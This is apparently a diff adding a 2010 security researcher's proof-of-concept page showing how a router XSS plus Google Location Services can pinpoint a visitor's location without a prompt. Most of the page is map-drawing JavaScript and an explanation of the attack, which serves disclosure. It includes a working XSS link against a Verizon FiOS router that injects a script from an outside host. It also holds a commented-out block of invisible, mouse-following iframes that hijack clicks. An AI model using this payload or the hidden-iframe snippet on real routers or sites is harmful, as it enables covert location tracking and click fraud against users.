@@ -1,0 +1,155 @@
+<html><head><title>samy's geolocation proof of concept</title>
+
+    <script src="http://www.google.com/jsapi?key=ABQIAAAAE832vXBnYzPJQygTlSp3lRT1HRZhlcqU_c8GpWgFFmzOYQpfPBQpN_lj_MffQ2zwIrSjyHYTFGq1NQ" type="text/javascript"></script>
+    <script type="text/javascript">
+      google.load("jquery", "1.3.2");
+      google.load("maps", "2.x");
+    </script>
+    <script type="text/javascript">
+    // <![CDATA[
+    var map = null;
+    var overlay = null;
+	var geo = null;
+
+function st()
+{
+    var g = {
+        initialize: function() {
+            map = new GMap2(document.getElementById("map"));
+            map.setCenter(new GLatLng(34.1072998047,-118.371902466), 10);
+            map.addControl(new GSmallMapControl());
+            map.addControl(new GMapTypeControl());
+        },
+        getCircleOverlay: function(lat, lon, err) {
+            with (Math) {
+                var points = Array();
+                var d = err/6378800;// accuracy / meters of Earth radius = radians  
+                var lat1 = (PI/180)* lat; // radians
+                var lng1 = (PI/180)* lon; // radians 
+                for (var a = 0 ; a < 361 ; a+=10 ) {
+                    var tc = (PI/180)*a;
+                    var y = asin(sin(lat1)*cos(d)+cos(lat1)*sin(d)*cos(tc));
+                    var dlng = atan2(sin(tc)*sin(d)*cos(lat1),cos(d)-sin(lat1)*sin(y));
+                    var x = ((lng1-dlng+PI) % (2*PI)) - PI ; // MOD function
+                    var point = new GLatLng(parseFloat(y*(180/PI)),parseFloat(x*(180/PI)));
+                    points.push(point);
+                }
+            }
+            return new GPolygon(points,'#0000ff',1,1,'#0000ff',0.2)
+        },
+        zoomLevel: function(a, step) {
+            step++;
+            map.setCenter(new GLatLng(a.coords.latitude, a.coords.longitude), step);
+            if (step > 14) return;
+            window.setTimeout(function() { geo.zoomLevel(a, step) }, 250);
+        },
+        setMap: function(a) {
+            var zoomLevel = 14;
+            if (a.coords.accuracy > 500)
+                zoomLevel = 10;
+            map.setCenter(new GLatLng(a.coords.latitude, a.coords.longitude), zoomLevel);
+        //    if (overlay) map.removerOverlay(overlay);
+            overlay = geo.getCircleOverlay(a.coords.latitude, a.coords.longitude, a.coords.accuracy);
+            map.addOverlay(overlay);
+			$('#js-return').innerHTML = '';
+            $('#js-return').html('<h2>'+map.getCenter()+'</h2>');
+        },
+        setMap2: function(lat, lon, acc) {
+            var zoomLevel = 15;
+            if (acc> 500)
+                zoomLevel = 10;
+			map.setCenter(new GLatLng(lat, lon), zoomLevel);
+            //if (overlay) map.removerOverlay(overlay);
+            overlay = geo.getCircleOverlay(lat, lon, acc);
+            map.addOverlay(overlay);
+			$('#js-return').innerHTML = '';
+            $('#js-return').html('<h2>'+map.getCenter()+'</h2>');
+        },
+        handleError: function(a) {
+        },
+        locateMeOnMap: function() {
+            navigator.geolocation.getCurrentPosition(this.setMap, this.handleError);
+        }
+    }
+	return g;
+}
+
+	geo = st();
+    $(document).ready(function() {
+		geo.initialize();
+		geo.setMap2(0, 0, 0);
+    });
+    // ]]>
+    </script>
+</head>
+<body>
+
+<!--<style>body{margin:0px;padding:0px;}</style><div style="overflow:hidden;width:1px;height:1px;position:absolute;" id=v0><iframe src="http://epochrises.com/links.html" style="border:0px;left:-118px;top:-23px;position:absolute;filter:alpha(opacity=0);z-index:1;opacity:0;overflow:hidden;width:1184px;height:667px;"></iframe></div><div style="overflow:hidden;width:1px;height:1px;position:absolute;" id=v1><iframe src="http://epochrises.com/links.html" style="border:0px;left:-33px;top:-21px;position:absolute;filter:alpha(opacity=0);z-index:1;opacity:0;overflow:hidden;width:1184px;height:667px;"></iframe></div><div id=v2></div><script>var d=document;if(!d.all)d.captureEvents(Event.MOUSEMOVE);var id=0;var p=[];d.onmousemove=function(e){p[0]=d.all?event.clientX+d.body.scrollLeft:e.pageX;p[1]=d.all?event.clientY+d.body.scrollTop:e.pageY;var i=d.getElementById("v"+id).style;i.left=p[0]+"px";i.top=p[1]+"px";};function l(){var i=d.getElementById("v"+id).style;i.visibility="hidden";id=(id+1)%3;var i=d.getElementById("v"+id).style;i.visibility="visible";i.left=p[0]+"px";i.top=p[1]+"px";setTimeout(function(){l()},id==2?1000:2000);}l();</script>-->
+
+
+
+<a href="http://samy.pl">home page</a> || <a href="http://twitter.com/samykamkar">follow my twitter</a> || <a href="http://namb.la">blog</a> || <a href="mailto:code@samy.pl">email me</a> || samy kamkar<hr>
+
+
+
+
+
+<b>Mapping a web browser to GPS coordinates via router XSS + Google Location Services without prompting the user</b><p>
+
+Welcome. Here is a proof of concept on obtaining *accurate* GPS coordinates of a user sitting behind a web browser via router XSS. <b>The router and web browser themselves contain NO geolocation/GPS data. This is also *not* IP based geolocation.</b><p>
+
+<b><font color=red>Unfortunately, shortly after my release of this attack (and presentations at <a href="https://www.youtube.com/watch?v=fEmO7wQKCMw">Defcon/Blackhat</a> / <a href="http://www.theregister.co.uk/2010/01/05/geo_location_stealing_hack/">press</a>), Google has both blocked my tool and altered their system to prevent this from working. It is still exploitable, however I will leave that up to the (motivated) reader.</font></b><p>
+
+The method works like this:<br>
+1. You visit a malicious web site (why are people so mean?)<br>
+2. The web site has a hidden XSS against your router (in this example, I'm using an <a href="/vzwfios/">XSS I discovered in the Verizon FiOS router</a>)<br>
+3. The XSS obtains the MAC address of the router via AJAX.<br>
+4. The MAC address is then sent to the malicious person. In the test case below, it's sent to me (not that I'm malicious!)<br>
+5. I then take the MAC address and send it along to Google Location Services. This is an HTTP-based service where router MAC addresses are mapped to approximate GPS coordinates from other data sources. <b>There are NO special browser requirements, nor does a user need to be prompted.</b> I determined this protocol by using <a target=_net href="http://www.mozilla.com/en-US/firefox/geolocation/">Firefox's Location-Aware Browsing</a>.<br>
+6. I grab the coordinates and show it to you in a pretty map below.<p>
+
+If you're on a Verizon FiOS router and logged in, you can <a target=_new href="http://192.168.1.1/index.cgi?active_page=9098&req_mode=0&mimic_button_field=goto%3a+9098..&button_value=9098&ssid=samy%20was%20here<script src=http://samy.pl/mapxss/fiospwn.js></script>">test this XSS here</a>. This was tested on a Westell UltraLine Series3 firmware 1.02.00.04.<p>
+
+If you're on Firefox or Chrome, you can <a href="#" onclick="geo=st();geo.locateMeOnMap();return false;"><b>test the Location Services by clicking here</b></a>. While this asks you to share your location, the XSS does <b>NOT</b> prompt the user!<p>
+
+
+<form method=GET>
+Or, you can simply test the Location by entering a router MAC address:<br>
+<!--(Example: MAC of my previous router, 00-11-24-ec-72-cf, actually located at <a target=_blank href="http://maps.google.com/maps?f=q&source=s_q&hl=en&geocode=&q=7070+Flight+Ave,+Los+Angeles,+CA+90045&sll=34.091968,-118.345913&sspn=0.008316,0.013154&ie=UTF8&hq=&hnear=7070+Flight+Ave,+Los+Angeles,+California+90045&z=16">7070 Flight Ave, Culver City CA</a> for comparison)<br>-->
+<input type=text name=mac value="">&nbsp; <input type=submit value="Search MAC"><p>
+
+To view other cool stuff, check out <a href="http://samy.pl">my website</a> or <a href="http://twitter.com/samykamkar">follow my twitter</a>.<p>
+
+developed by <a href="http://samy.pl">samy kamkar</a>, 01/04/2010
+<p>
+<hr>
+
+<pre>
+<div id=addy>
+
+</div>
+</pre>
+
+    <div id="js-return"></div>
+    <div id="js">
+      <div id="geo">
+        <div id="map" style="position:absolute;width:500px;height:400px;"></div>
+      </div>
+    </div>
+
+<script type="text/javascript">
+
+  var _gaq = _gaq || [];
+  _gaq.push(['_setAccount', 'UA-6127617-2']);
+  _gaq.push(['_trackPageview']);
+
+  (function() {
+    var ga = document.createElement('script'); ga.type = 'text/javascript'; ga.async = true;
+    ga.src = ('https:' == document.location.protocol ? 'https://' : 'http://') + 'stats.g.doubleclick.net/dc.js';
+    var s = document.getElementsByTagName('script')[0]; s.parentNode.insertBefore(ga, s);
+  })();
+
+</script>
+
+</body>
+</html>
